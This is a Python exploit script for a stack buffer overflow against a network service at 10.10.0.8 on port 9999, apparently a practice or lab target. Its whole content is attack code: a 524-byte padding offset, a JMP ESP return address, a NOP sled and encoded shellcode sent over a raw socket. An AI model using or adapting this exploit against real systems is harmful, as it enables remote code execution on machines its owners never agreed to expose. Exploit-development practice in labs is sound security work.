#!/bin/python3
import sys
import socket
import struct

def p32(data):
  return struct.pack('<I',data)

bad_char = b"\x00"
offset = 524
jmp_esp = p32(0x311712f3)
nop_sled = b"\x90" * 16
buffer = b"A" * offset + b"BBBB"

shellcode =  b""
shellcode += b"\xd9\xed\xd9\x74\x24\xf4\xba\x20\x2c\x20\x6d"
shellcode += b"\x5b\x2b\xc9\xb1\x12\x83\xc3\x04\x31\x53\x13"
shellcode += b"\x03\x73\x3f\xc2\x98\x42\xe4\xf5\x80\xf7\x59"
shellcode += b"\xa9\x2c\xf5\xd4\xac\x01\x9f\x2b\xae\xf1\x06"
shellcode += b"\x04\x90\x38\x38\x2d\x96\x3b\x50\xa4\x62\xa2"
shellcode += b"\x94\xd0\x70\xda\xc5\x7c\xfc\x3b\x55\x1a\xae"
shellcode += b"\xea\xc6\x50\x4d\x84\x09\x5b\xd2\xc4\xa1\x0a"
shellcode += b"\xfc\x9b\x59\xbb\x2d\x73\xfb\x52\xbb\x68\xa9"
shellcode += b"\xf7\x32\x8f\xfd\xf3\x89\xd0"


buffer = b"A" * offset + jmp_esp + nop_sled + shellcode

try:
  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("10.10.0.8",9999))
  s.send((buffer+b"\r\n"))
  s.close()
except:
  print("error")
  sys.exit()